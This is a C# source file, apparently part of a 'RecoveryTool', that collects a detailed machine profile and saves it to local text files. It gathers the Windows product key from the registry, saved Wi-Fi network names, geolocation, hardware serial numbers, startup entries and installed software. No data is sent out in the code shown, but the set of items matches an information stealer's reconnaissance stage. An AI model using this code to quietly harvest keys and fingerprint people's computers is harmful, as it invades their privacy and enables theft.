using RecoveryTool.Recovery.Utilities;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Management;
using Microsoft.Win32;
using System.Text;

namespace RecoveryTool.Recovery.System
{
    public class HardwareInfo
    {
        public record SystemComponentsInfo(string ProcessorId, string MotherboardSerial, string BIOSVersion, string TotalPhysicalMemory, string GraphicsCardName);

        public static async Task SaveHardwareInfoAsync()
        {
            string hardwarePath = Common.EnsureHardwarePath();

            Task<string> osInfoTask = Task.Run(() => SystemInfo.GetOperatingSystemInfo());
            Task<string> windowsProductKeyTask = Task.Run(() => GetWindowsProductKey());
            Task<string> savedWifiTask = Task.Run(() => GetSavedWifiNetworks());
            Task<SystemComponentsInfo> systemComponentsInfoTask = GetSystemComponentsInfo();
            Task<string> biosVersionTask = SystemHelper.GetWmiProperty("Win32_BIOS", "Version");

            var locationTask = SystemInfo.GetLocationAsync();
            var systemUptimeTask = SystemInfo.GetSystemUptimeAsync();
            var networkAdapterDetailsTask = NetworkInfo.GetNetworkAdapterDetailsAsync();

            await Task.WhenAll(osInfoTask, windowsProductKeyTask, savedWifiTask, locationTask, systemUptimeTask, networkAdapterDetailsTask, systemComponentsInfoTask, biosVersionTask);

            var builder = new StringBuilder();
            builder.AppendLine($"Operating System Information: {await osInfoTask}");
            builder.AppendLine($"Location: {await locationTask}");
            builder.AppendLine($"Windows Product Key: {await windowsProductKeyTask}");
            builder.AppendLine($"BIOS Version: {await biosVersionTask}");
            builder.AppendLine($"------------------------------------------");

            await SaveSystemComponentsInfoAsync(hardwarePath, await systemComponentsInfoTask);
            await SaveStartupProgramsAsync();

            builder.AppendLine($"Saved WIFI Networks: {await savedWifiTask}");
            builder.AppendLine($"System Uptime: {await systemUptimeTask}");
            builder.AppendLine($"------------------------------------------");
            builder.AppendLine("Network Details:");
            builder.AppendLine(await networkAdapterDetailsTask);

            string filePath = Path.Combine(hardwarePath, "HardwareInfo.txt");
            await File.WriteAllTextAsync(filePath, builder.ToString());
        }

        private static async Task SaveSystemComponentsInfoAsync(string directoryPath, SystemComponentsInfo components)
        {
            string filePath = Path.Combine(directoryPath, "SystemComponentsInfo.txt");
            StringBuilder sb = new();
            sb.AppendLine($"Processor ID: {components.ProcessorId}");
            sb.AppendLine($"Graphics Card Name: {components.GraphicsCardName}");
            sb.AppendLine($"Motherboard Serial Number: {components.MotherboardSerial}");
            sb.AppendLine($"Total Physical Memory: {components.TotalPhysicalMemory}");
            await File.WriteAllTextAsync(filePath, sb.ToString());
        }

        public static async Task SaveHardwareAndNetworkInfoAsync()
        {
            string hardwarePath = Common.EnsureHardwarePath();
            await SaveHardDriveInformationAsync(hardwarePath);
            await NetworkInfo.SaveNetworkTrafficInfoAsync(hardwarePath);
        }

        public static async Task SaveSoftwareAndUpdatesInfoAsync()
        {
            string hardwarePath = Common.EnsureHardwarePath();
            string installedSoftware = SoftwareInfo.GetInstalledSoftware();
            string systemUpdates = await SoftwareInfo.GetSystemUpdatesAsync();

            string filePath = Path.Combine(hardwarePath, "SoftwareAndUpdatesInfo.txt");
            using StreamWriter sw = new(filePath);
            sw.WriteLine("Installed Software:");
            sw.WriteLine(installedSoftware);
            sw.WriteLine("------------------------------------------");
            sw.WriteLine("System Updates:");
            sw.WriteLine(systemUpdates);
        }

        public static async Task SaveStartupProgramsAsync()
        {
            string hardwarePath = Common.EnsureHardwarePath();
            string startupProgramsFilePath = Path.Combine(hardwarePath, "StartupPrograms.txt");
            StringBuilder sb = new();

            await Task.Run(() => {
                sb.AppendLine("Startup Programs from Registry:");
                RetrieveStartupEntriesFromRegistry(Registry.CurrentUser, sb, "HKEY_CURRENT_USER");
                RetrieveStartupEntriesFromRegistry(Registry.LocalMachine, sb, "HKEY_LOCAL_MACHINE");
            });

            string[] startupFolders = [
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup)
            ];

            foreach (var folder in startupFolders)
            {
                sb.AppendLine($"\nStartup Programs from {folder} Folder:");
                foreach (var file in Directory.GetFiles(folder))
                {
                    sb.AppendLine(file);
                }
            }

            await File.WriteAllTextAsync(startupProgramsFilePath, sb.ToString());
        }

        private static void RetrieveStartupEntriesFromRegistry(RegistryKey rootKey, StringBuilder sb, string rootKeyName)
        {
            string[] registryPaths = [
                @"Software\Microsoft\Windows\CurrentVersion\Run",
                @"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                @"Software\Microsoft\Windows\CurrentVersion\RunOnceEx",
                @"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
            ];

            foreach (var path in registryPaths)
            {
                using RegistryKey key = rootKey.OpenSubKey(path);
                if (key != null)
                {
                    foreach (var valueName in key.GetValueNames())
                    {
                        string programPath = key.GetValue(valueName).ToString();
                        sb.AppendLine($"{rootKeyName}\\{path}: {valueName} = {programPath}");
                    }
                }
            }
        }

        private static async Task<SystemComponentsInfo> GetSystemComponentsInfo()
        {
            string processorId = await SystemHelper.GetWmiProperty("Win32_Processor", "ProcessorId");
            string motherboardSerial = await SystemHelper.GetWmiProperty("Win32_BaseBoard", "SerialNumber");
            string biosVersion = await SystemHelper.GetWmiProperty("Win32_BIOS", "Version");
            string totalPhysicalMemory = await GetTotalPhysicalMemory();
            string graphicsCardName = await SystemHelper.GetWmiProperty("Win32_VideoController", "Name");

            return new SystemComponentsInfo(processorId, motherboardSerial, biosVersion, totalPhysicalMemory, graphicsCardName);
        }

        private static async Task<string> GetTotalPhysicalMemory()
        {
            return await Task.Run(() => {
                try
                {
                    var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                    foreach (var memoryBytes in from ManagementObject obj in searcher.Get()
                                                let memoryBytes = Convert.ToInt64(obj["TotalPhysicalMemory"])
                                                select memoryBytes)
                    {
                        return $"{memoryBytes / 1024 / 1024} MB";
                    }

                    return "Total Physical Memory Not Available";
                }
                catch (ManagementException ex)
                {
                    return $"Failed to retrieve Total Physical Memory: {ex.Message}";
                }
            });
        }

        private static string GetWindowsProductKey()
        {
            const string keyPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform";
            using var registry = Registry.LocalMachine.OpenSubKey(keyPath, writable: false);
            return registry?.GetValue("BackupProductKeyDefault") as string ?? "Product Key Not Found";
        }


        public static string GetSavedWifiNetworks()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                StringBuilder wifiNetworks = new();
                Process process = new()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "wlan show profiles",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                while (!process.StandardOutput.EndOfStream)
                {
                    string line = process.StandardOutput.ReadLine();
                    if (line.Contains("All User Profile"))
                    {
                        wifiNetworks.AppendLine(line.Split(':')[1].Trim());
                    }
                }
                return wifiNetworks.ToString();
            }
            return "Feature not available on this OS";
        }

        public static async Task SaveHardDriveInformationAsync(string directoryPath)
        {
            string filePath = Path.Combine(directoryPath, "HardDrives.txt");
            StringBuilder sb = new();

            try
            {
                var driveQuery = new ManagementObjectSearcher("SELECT DeviceID, Model, Size, SerialNumber FROM Win32_DiskDrive");

                foreach (ManagementObject drive in driveQuery.Get().Cast<ManagementObject>())
                {
                    sb.AppendLine($"Drive Model: {drive["Model"] ?? "Unknown"}");
                    sb.AppendLine($"Size: {ConvertToGigabytes(drive["Size"])} GB");
                    sb.AppendLine($"Serial Number: {drive["SerialNumber"] ?? "Unknown"}");

                    var partitionQuery = new ManagementObjectSearcher(
                        $"ASSOCIATORS OF {{Win32_DiskDrive.DeviceID='{drive["DeviceID"]}'}} WHERE AssocClass = Win32_DiskDriveToDiskPartition");

                    bool hasPartitions = false;
                    foreach (ManagementObject partition in partitionQuery.Get().Cast<ManagementObject>())
                    {
                        hasPartitions = true;
                        var logicalDiskQuery = new ManagementObjectSearcher(
                            $"ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='{partition["DeviceID"]}'}} WHERE AssocClass = Win32_LogicalDiskToPartition");

                        foreach (ManagementObject logicalDisk in logicalDiskQuery.Get().Cast<ManagementObject>())
                        {
                            sb.AppendLine($"  Logical Disk: {logicalDisk["DeviceID"] ?? "Unknown"}");
                            sb.AppendLine($"  File System: {logicalDisk["FileSystem"] ?? "Unknown"}");
                            sb.AppendLine($"  Free Space: {ConvertToGigabytes(logicalDisk["FreeSpace"])} GB");
                            sb.AppendLine($"  Total Size: {ConvertToGigabytes(logicalDisk["Size"])} GB");
                        }
                    }

                    if (!hasPartitions)
                    {
                        sb.AppendLine("  No partitions found.");
                    }

                    sb.AppendLine();
                }
            }
            catch (ManagementException ex)
            {
                sb.AppendLine($"Error accessing WMI data: {ex.Message}");
            }

            await File.WriteAllTextAsync(filePath, sb.ToString());
        }

        private static string ConvertToGigabytes(object size)
        {
            if (size != null && long.TryParse(size.ToString(), out long bytes))
            {
                return (bytes / (1024L * 1024 * 1024)).ToString();
            }
            return "Unknown";
        }
    }
}